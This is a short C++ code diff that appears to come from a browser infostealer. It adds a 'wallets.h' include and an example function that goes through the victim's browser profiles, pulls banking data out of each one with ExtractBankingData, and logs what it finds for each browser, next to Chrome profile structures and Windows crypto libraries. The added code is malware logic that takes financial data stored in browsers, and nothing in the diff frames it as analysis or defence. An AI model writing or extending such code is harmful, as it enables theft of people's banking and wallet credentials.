@@ -8,9 +8,26 @@
 #include <memory>
 #include "../common.h"
 #include "sqlite_minimal.cpp"
+#include "wallets.h"
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
+
+#include "wallets.h"
+
+void ExampleUse() {
+    auto profiles = GetBrowserProfiles();
+    for (const auto& bp : profiles) {
+        const std::string& browser = bp.first;
+        const std::string& profilePath = bp.second;
+
+        auto foundBanks = ExtractBankingData(profilePath);
+        for (const auto& info : foundBanks) {
+            LogInfo(("Bank found in " + browser + ": " + info).c_str());
+        }
+    }
+}
+
 
 // Chrome data structures
 struct ChromeProfile {
